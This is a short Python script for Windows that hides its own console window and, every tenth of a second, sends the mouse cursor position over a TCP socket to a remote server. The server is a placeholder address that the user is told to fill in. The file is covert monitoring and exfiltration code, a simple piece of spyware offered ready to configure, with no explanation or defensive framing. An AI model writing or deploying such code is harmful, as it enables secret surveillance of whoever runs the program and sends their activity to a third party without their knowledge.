import socket
import ctypes
import time

SERVER_IP = "YOU_SERVER_IP" # replace with your server ip
SERVER_PORT = 943 # Replace with your server port

def cocki_mocki(message):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((SERVER_IP, SERVER_PORT))
            sock.sendall(message.encode())

    except Exception as e:
        print(f"ERROR: {e}")

def Daddyyy_uwu():
    user32 = ctypes.windll.user32
    point = ctypes.wintypes.POINT()

    while True:
        if user32.GetCursorPos(ctypes.byref(point)):
            message = f"X: {point.x}, Y: {point.y}"
            cocki_mocki(message)
        time.sleep(0.1) # Prevent high CPU usage

if __name__ == "__main__":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0) # Hide the console window
    Daddyyy_uwu()